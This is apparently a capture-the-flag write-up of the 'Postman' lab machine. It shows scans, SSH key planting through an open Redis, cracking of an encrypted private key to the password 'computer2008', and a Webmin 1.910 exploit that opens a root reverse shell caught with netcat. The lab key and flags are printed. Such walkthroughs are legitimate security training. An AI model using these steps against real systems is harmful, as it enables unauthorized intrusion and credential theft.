# Scan

```bash
ghost@localhost [14:55:12] [~/Documents/hacking/tj-null-boxes/postman] [master]
-> % rustscan -a $IP -- -sC -sV

Open 10.10.10.160:22
Open 10.10.10.160:80
Open 10.10.10.160:6379
Open 10.10.10.160:10000

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46834ff13861c01c74cbb5d14a684d77 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDem1MnCQG+yciWyLak5YeSzxh4HxjCgxKVfNc1LN+vE1OecEx+cu0bTD5xdQJmyKEkpZ+AVjhQo/esF09a94eMNKcp+bhK1g3wqzLyr6kwE0wTncuKD2bA9LCKOcM6W5GpHKUywB5A/TMPJ7UXeygHseFUZEa+yAYlhFKTt6QTmkLs64sqCna+D/cvtKaB4O9C+DNv5/W66caIaS/B/lPeqLiRoX1ad/GMacLFzqCwgaYeZ9YBnwIstsDcvK9+kCaUE7g2vdQ7JtnX0+kVlIXRi0WXta+BhWuGFWtOV0NYM9IDRkGjSXA4qOyUOBklwvienPt1x2jBrjV8v3p78Tzz
|   256 2d8d27d2df151a315305fbfff0622689 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIRgCn2sRihplwq7a2XuFsHzC9hW+qA/QsZif9QKAEBiUK6jv/B+UxDiPJiQp3KZ3tX6Arff/FC0NXK27c3EppI=
|   256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIF3FKsLVdJ5BN8bLpf80Gw89+4wUslxhI3wYfnS+53Xd
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
6379/tcp  open  redis   syn-ack Redis key-value store 4.0.9
10000/tcp open  http    syn-ack MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.910
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Port 80

Looks like generic site.

```bash
ghost@localhost [15:14:58] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % feroxbuster -u http://postman/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -k

200      GET       91l      253w     3844c http://postman/
301      GET        9l       28w      299c http://postman/js => http://postman/js/
301      GET        9l       28w      303c http://postman/upload => http://postman/upload/
301      GET        9l       28w      303c http://postman/images => http://postman/images/
301      GET        9l       28w      300c http://postman/css => http://postman/css/
301      GET        9l       28w      302c http://postman/fonts => http://postman/fonts/
```


# Port 10000 (postman:10000)

Gives a Webmin login portal. I tried default credential `admin:admin` and it failed.


# 6379 Redis

```bash
ghost@localhost [15:19:43] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % nmap --script redis-info -sV -p 6379 10.10.10.160
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-11 15:19 +08
Nmap scan report for postman (10.10.10.160)
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9 (64 bits)
| redis-info:
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 640
|   Used CPU (sys): 1.69
|   Used CPU (user): 0.59
|   Connected clients: 1
|   Connected slaves: 0
|   Used memory: 821.70K
|   Role: master
|   Bind addresses:
|     0.0.0.0
|     ::1
|   Client connections:
|_    10.10.14.8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.96 seconds
```

Connecting to redis with netcat for some enumeration

```bash
config_file:/etc/redis/redis.conf
```

Looking through Hacktricks, found a way to upload SSH key (https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#ssh). I generated a SSH key, then add 2 leading and tailing new lines (weird but it does not works without new lines).

```bash
ghost@localhost [15:14:40] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % cat -p ghost.pub | redis-cli -h 10.10.10.160 -x set ssh_key
OK
ssh
ghost@localhost [15:14:48] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename authorized_keys
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> exit

ghost@localhost [15:15:16] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % ssh redis@10.10.10.160 -i ghost
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$
```


# Lateral movement

Under `/home` directory, found a user `Matt`.

```bash
ghost@localhost [15:15:16] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % ssh redis@10.10.10.160 -i ghost
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ ls /home
Matt
```

Running linpeas, found a SSH key backup by the user `Matt`.

```bash
-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

It seems to be encrypted, so copy to local, convert to hash and started cracking with John The Ripper.

```bash
ghost@localhost [15:34:30] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % ssh2john Matt.rsa.bak > hash

ghost@localhost [15:34:46] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % john hash --fork=4 /usr/share/wordlists/rockyou.txt

ghost@localhost [15:37:20] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (Matt.rsa.bak)
2 1g 0:00:00:00 DONE (2022-11-12 15:37) 5.882g/s 362952p/s 362952c/s 362952C/s comunista..computer2008
3 0g 0:00:00:04 DONE (2022-11-12 15:37) 0g/s 861877p/s 861877c/s 861877C/sa6_123
4 0g 0:00:00:04 DONE (2022-11-12 15:37) 0g/s 859817p/s 859817c/s 859817C/s xCvBnM,..*7¡Vamos!
1 0g 0:00:00:04 DONE (2022-11-12 15:37) 0g/s 857757p/s 857757c/s 857757C/sie168
Waiting for 3 children to terminate
Session completed.
```

The password is `computer2008`.

```bash
redis@Postman:/dev/shm$ su Matt
Password:

Matt@Postman:/dev/shm$ cd ~

Matt@Postman:~$ cat user.txt
54d2b6bee669cba0ce3b32ddd48ff1d8
```

Once I login, I run linpeas, and but under Matt, I do not find anything interesting.

However, from linpeas output in running processes section, I found out that Webmin is running via `root`. Then under `/etc/webmin` I found the version it is running is `1.910`.

```bash
Matt@Postman:/etc/webmin$ cat version
1.910
```

Using the same credential `Matt:computer2008` I can login to Webmin portal https://Postman:10000.


```bash
ghost@localhost [17:07:37] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % searchsploit webmin
...
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)  | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                    | linux/webapps/47293.sh
```

But I will not be using Metasploit. The vulnerability is in Pacakge Update module (https://nvd.nist.gov/vuln/detail/CVE-2019-12840).

Using this exploit (https://github.com/roughiz/Webmin-1.910-Exploit-Script) I can get back root shell.

```bash
ghost@localhost [17:11:00] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % python2 webmin_exploit.py --rhost 10.10.10.160 --rport 10000 --lhost 10.10.14.8 --lport 4445 -p computer2008 -u Matt -s True


ghost@localhost [17:09:19] [~/Documents/hacking/tj-null-boxes/postman] [master *]
-> % nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.160] 54920
id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
4450774fa8bc1f74d73d29b3bf74db25
```
